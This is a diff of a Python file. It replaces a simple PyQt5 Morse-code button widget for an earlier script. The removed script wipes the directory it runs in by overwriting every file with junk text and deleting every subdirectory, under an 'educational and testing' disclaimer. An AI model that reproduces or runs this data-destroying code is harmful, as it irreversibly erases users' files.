@@ -1,36 +1,26 @@
-import random, os, shutil # Imports
+from PyQt5.QtWidgets import QWidget, QTextBrowser, QPushButton, QLineEdit
 
-fscan = os.listdir() # Scanning the files and directories
-count = 0 # Counter for files and directories
+code = {
+    "a": ".-",    "b": "-...",    "c": "-.-.",    "d": "-..",    "e": ".",    "f": "..-.",    "g": "--.",    "h": "....",    "i": "..",    "j": ".---",    "k": "-.-",    "l": ".-..",    "m": "--",    "n": "-.",    "o": "---",    "p": ".--.",    "q": "--.-",    "r": ".-.",    "s": "...",    "t": "-",    "u": "..-",    "v": "...-",    "w": ".--",    "x": "-..-",    "y": "-.--",    "z": "--.."}
 
-print("\n---------Script--------\nFound files and dirs: ", *fscan, "\n-------------------") # Just a print for files
 
-try: # Using the "try" to execute
-    for file in fscan: # scanning the files and dir names in the fscan list
+class MorseCode(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Азбука Морзе 2")
+        self.setGeometry(300, 300, 330, 100)
+        alphabet_buttons = dict()
 
-        print(f"Starting...") # Print-out
+        for i, key in enumerate(list(code.keys())):
+            btn = QPushButton(key, self)
+            btn.resize(20, 20)
+            btn.move(10 + (i * 20) % 300, 10 + ((i * 20) // 300) * 20)
+            btn.clicked.connect(self.add_code)
+            alphabet_buttons[key] = btn
+        self.result = QLineEdit(self)
+        self.result.move(10, 50)
+        self.result.resize(280, 20)
+        self.alphabet_buttons = alphabet_buttons
 
-        if os.path.isfile(file): # Checking, whether the name is file, if yes, then proceed
-            print(f"\n---------Script--------\nOverwriting {file}..\n-------------------\n.")
-            k = random.randint(9999, 999999) # Getting a random value (can be reblaced with string or a fixed int)
-            f = open(f"{file}", "w") # Open the file as writable
-            f.write("Oops, overwritten! " * k) # Replace its contents with text (can be replaced)
-            count += 1
-            print(f"\n---------Script--------\nOverwritten {file}. Deleted or/and overwritten: {count}\n-------------------\n")
-        else: # Or, if name isn't a file, then proceed doing this
-            print(f"\n---------Script--------\nDeleting {file} with its contents..\n_______________\n.")
-            shutil.rmtree(file) # Using shutil (a library) we're removing the directory
-            count += 1
-            print(f"\n---------Script--------\nDeleted {file}. Deleted or/and overwritten: {count}\n-------------------\n")
-
-except Exception as ex: # Printing out error (just for script to be beautiful)
-    print(f"\n____Script-Error_____\nOops, an error, details: {ex}\n-------------------______\n") # Printing out the error
-
-print(f"Total: {count} file(s) and/or dir(s)")
-print("\n=====COMPLETE=====\n") # Notify user that script executed
-
-# Written by Lev Sokolov on Sun. Mar. 4:05 AM.
-# USE AT YOUR OWN RISK! CAN REMOVE IMPORTANT FOR YOU FILES!
-
-# MADE ONLY FOR EDUCATIONAL AND TESTING PURPOSES!
-
+    def add_code(self):
+        self.result.setText(self.result.text() + code[self.sender().text()])
